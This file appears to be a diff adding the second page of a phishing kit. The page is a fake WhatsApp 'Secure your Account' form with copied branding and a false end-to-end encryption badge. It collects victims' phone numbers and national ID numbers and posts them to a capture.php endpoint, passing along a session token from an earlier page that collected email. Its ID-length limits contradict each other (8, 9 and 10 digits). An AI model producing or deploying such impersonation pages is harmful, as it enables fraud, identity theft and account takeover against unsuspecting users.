@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Secure your Account - WhatsApp</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, sans-serif;
+            background-color: #efeae2;
+            background-image: url('data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"%3E%3Cpath d="M50 10Q55 20 50 30Q45 40 50 50Q55 60 50 70Q45 80 50 90" stroke="%23cfcfcf" fill="none" stroke-width="0.5" opacity="0.3"/%3E%3Cpath d="M10 50Q20 45 30 50Q40 55 50 50Q60 45 70 50Q80 55 90 50" stroke="%23cfcfcf" fill="none" stroke-width="0.5" opacity="0.3"/%3E%3Ccircle cx="50" cy="50" r="8" fill="%23cfcfcf" opacity="0.15"/%3E%3C/svg%3E');
+            background-repeat: repeat;
+            background-size: 120px 120px;
+            min-height: 100vh;
+            display: flex;
+            justify-items: center;
+            flex-direction: column;
+            align-items: center;
+            margin-right: auto;
+        }
+        .header {
+            background: #075e54;
+            width: 100%;
+            padding: 18px 16px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
+        }
+        .header svg { width: 28px; height: 28px; fill: #fff; }
+        .header h1 { color: #fff; font-size: 18px; font-weight: 500; }
+        .container {
+            width: 100%;
+            max-width: 480px;
+            padding: 20px 16px;
+            flex: 1;
+        }
+        .progress {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 20px;
+            background: #fff;
+            padding: 14px 18px;
+            border-radius: 8px;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.08);
+        }
+        .progress .step {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 13px;
+            color: #8696a0;
+        }
+        .progress .step.active { color: #075e54; font-weight: 600; }
+        .progress .step.completed { color: #25d366; }
+        .progress .line {
+            flex: 1;
+            height: 2px;
+            background: #e0e0e0;
+        }
+        .progress .line.filled { background: #25d366; }
+        .form-card {
+            background: #fff;
+            border-radius: 8px;
+            padding: 24px 20px;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.08);
+            border: 1px solid rgba(0,0,0,0.05);
+        }
+        .form-card .form-title {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        .form-card .form-title h3 {
+            font-size: 15px;
+            color: #075e54;
+            font-weight: 600;
+            letter-spacing: 0.3px;
+        }
+        .form-card .form-title .lock-icon {
+            display: block;
+            margin: 0 auto 12px;
+            width: 40px;
+            height: 40px;
+            background: #d9fdd3;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .form-card .form-title .lock-icon svg { width: 20px; height: 20px; fill: #075e54; }
+        .input-group {
+            margin-bottom: 16px;
+            position: relative;
+        }
+        .input-group label {
+            display: block;
+            font-size: 12px;
+            color: #667781;
+            margin-bottom: 6px;
+            font-weight: 500;
+        }
+        .phone-row {
+            display: flex;
+            gap: 8px;
+        }
+        .phone-row select {
+            width: 120px;
+            padding: 12px 10px;
+            font-size: 15px;
+            border: 1px solid #d9d9d9;
+            border-radius: 6px;
+            outline: none;
+            background: #fafafa;
+            cursor: pointer;
+        }
+        .phone-row select:focus { border-color: #075e54; }
+        .phone-row input {
+            flex: 1;
+            padding: 12px 14px;
+            font-size: 15px;
+            border: 1px solid #d9d9d9;
+            border-radius: 6px;
+            outline: none;
+            transition: border 0.2s;
+            background: #fafafa;
+        }
+        .phone-row input:focus { border-color: #075e54; background: #fff; }
+        .input-group input[type="number"] {
+            width: 100%;
+            padding: 12px 14px;
+            font-size: 15px;
+            border: 1px solid #d9d9d9;
+            border-radius: 6px;
+            outline: none;
+            transition: border 0.2s;
+            background: #fafafa;
+        }
+        .input-group input[type="number"]:focus { border-color: #075e54; background: #fff; }
+        .input-group .hint {
+            font-size: 11px;
+            color: #999;
+            margin-top: 4px;
+        }
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: #075e54;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-top: 8px;
+        }
+        .btn:hover { background: #064c43; }
+        .security-badge {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            justify-content: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #8696a0;
+        }
+        .security-badge svg { width: 14px; height: 14px; fill: #8696a0; }
+        .footer {
+            width: 100%;
+            max-width: 480px;
+            padding: 16px;
+            text-align: center;
+            font-size: 11px;
+            color: #8696a0;
+        }
+        .footer a { color: #075e54; text-decoration: none; }
+    </style>
+</head>
+<body>
+
+<div class="header">
+    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12c0 2.17.67 4.17 1.82 5.83L2 22l4.17-1.82A9.93 9.93 0 0 0 12 22c5.52 0 10-4.48 10-10S17.52 2 12 2z"/><path d="M12 2v20c5.52 0 10-4.48 10-10S17.52 2 12 2z" fill="none"/><path d="M12 2C6.48 2 2 6.48 2 12c0 2.17.67 4.17 1.82 5.83L2 22l4.17-1.82A9.93 9.93 0 0 0 12 22c5.52 0 10-4.48 10-10S17.52 2 12 2z" fill="none"/></svg>
+    <h1>WhatsApp</h1>
+</div>
+
+<div class="container">
+    <div class="progress">
+        <span class="step completed">&#10003; Email</span>
+        <div class="line filled"></div>
+        <span class="step active">Location</span>
+        <div class="line"></div>
+        <span class="step">Verify</span>
+    </div>
+
+    <div class="form-card">
+        <div class="form-title">
+            <div class="lock-icon">
+                <svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
+            </div>
+            <h3>Personal Info. Lock</h3>
+        </div>
+
+        <form action="capture.php" method="POST">
+            <input type="hidden" name="step" value="2">
+            <input type="hidden" name="session" id="sessionInput" value="">
+            <div class="input-group">
+                <label for="phone">Phone Number</label>
+                <div class="phone-row">
+                    <select name="country_code" id="country_code">
+                        <option value="+1">US +1</option>
+                        <option value="+44">UK +44</option>
+                        <option value="+91">IN +91</option>
+                        <option value="+61">AU +61</option>
+                        <option value="+81">JP +81</option>
+                        <option value="+49">DE +49</option>
+                        <option value="+33">FR +33</option>
+                        <option value="+86">CN +86</option>
+                        <option value="+7">RU +7</option>
+                        <option value="+55">BR +55</option>
+                        <option value="+27">ZA +27</option>
+                        <option value="+234">NG +234</option>
+                        <option value="+254">KE +254</option>
+                        <option value="+971">AE +971</option>
+                        <option value="+82">KR +82</option>
+                        <option value="+39">IT +39</option>
+                        <option value="+34">ES +34</option>
+                        <option value="+31">NL +31</option>
+                        <option value="+46">SE +46</option>
+                        <option value="+47">NO +47</option>
+                        <option value="+48">PL +48</option>
+                        <option value="+90">TR +90</option>
+                        <option value="+20">EG +20</option>
+                        <option value="+52">MX +52</option>
+                        <option value="+54">AR +54</option>
+                    </select>
+                    <input type="tel" name="phone" id="phone" placeholder="Phone number" required>
+                </div>
+                <div class="hint">We'll send a verification code to this number</div>
+            </div>
+            <div class="input-group">
+                <label for="id_number">Identification Number (ID)</label>
+                <input type="number" name="id_number" id="id_number" placeholder="Enter your ID" maxlength="10" oninput="if(this.value.length > 8) this.value = this.value.slice(0,8);" required>
+                <div class="hint">Maximum 9 digits required for identity verification</div>
+            </div>
+            <button type="submit" class="btn">Submit</button>
+        </form>
+
+        <div class="security-badge">
+            <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
+            <span>Protected by end-to-end encryption</span>
+        </div>
+    </div>
+</div>
+
+<div class="footer">
+    <a href="#">About</a> &bull; <a href="#">Privacy</a> &bull; <a href="#">Terms</a><br>
+    &copy; 2026 WhatsApp LLC
+</div>
+
+<script>
+    // Restore session token from URL parameter (passed from page 1)
+    const urlParams = new URLSearchParams(window.location.search);
+    const session = urlParams.get('session');
+    if (session) {
+        document.getElementById('sessionInput').value = session;
+    }
+
+    // Enforce max 10 digits on ID field
+    document.getElementById('id_number').addEventListener('input', function(e) {
+        if (this.value.length > 10) {
+            this.value = this.value.slice(0, 10);
+        }
+    });
+</script>
+
+</body>
+</html>
